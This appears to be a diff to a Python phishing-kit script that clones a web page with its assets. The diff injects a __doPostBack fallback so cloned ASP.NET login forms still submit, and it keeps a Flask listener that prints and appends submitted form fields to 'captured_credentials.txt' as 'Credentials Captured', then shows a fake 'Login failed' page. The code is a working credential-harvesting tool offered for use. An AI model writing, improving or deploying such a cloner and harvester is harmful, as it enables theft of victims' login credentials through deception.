@@ -41,15 +41,47 @@ def clone_and_modify(url):
         elif tag.name in ["script", "img"]:
             download_asset(tag, "src")
 
+    # Inject __doPostBack fallback
+    if "__doPostBack" not in soup.text:
+        script_tag = soup.new_tag("script")
+        script_tag.string = '''
+        function __doPostBack(eventTarget, eventArgument) {
+            var theForm = document.forms[0];
+            if (!theForm) return;
+            
+            if (!theForm.__EVENTTARGET) {
+                var input = document.createElement("input");
+                input.type = "hidden";
+                input.name = "__EVENTTARGET";
+                theForm.appendChild(input);
+            }
+            if (!theForm.__EVENTARGUMENT) {
+                var input = document.createElement("input");
+                input.type = "hidden";
+                input.name = "__EVENTARGUMENT";
+                theForm.appendChild(input);
+            }
+
+            theForm.__EVENTTARGET.value = eventTarget;
+            theForm.__EVENTARGUMENT.value = eventArgument;
+            theForm.submit();
+        }
+        '''
+        if soup.body:
+            soup.body.append(script_tag)
+        else:
+            soup.append(script_tag)
+
     # Save modified HTML
     with open(f"{output_dir}/index.html", "w", encoding='utf-8') as file:
         file.write(soup.prettify())
 
-    # Save listener
+    # Save listener server
     with open(f"{output_dir}/server.py", "w") as file:
         file.write(LISTENER_SCRIPT)
 
     print(f"[+] Page cloned with assets. Open output/index.html to test locally.")
+
 
 LISTENER_SCRIPT = '''
 from flask import Flask, request
@@ -60,16 +92,17 @@ app = Flask(__name__)
 def capture():
     data = request.form.to_dict()
     print("[+] Credentials Captured:", data)
-    
-    # Optional: Log captured credentials to a file
+
+    # Optional: Save to file
     with open('captured_credentials.txt', 'a') as f:
         f.write(str(data) + '\\n')
-    
+
     return "<h1>Login failed. Try again later.</h1>"
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
 '''
+
 
 if __name__ == "__main__":
     import argparse
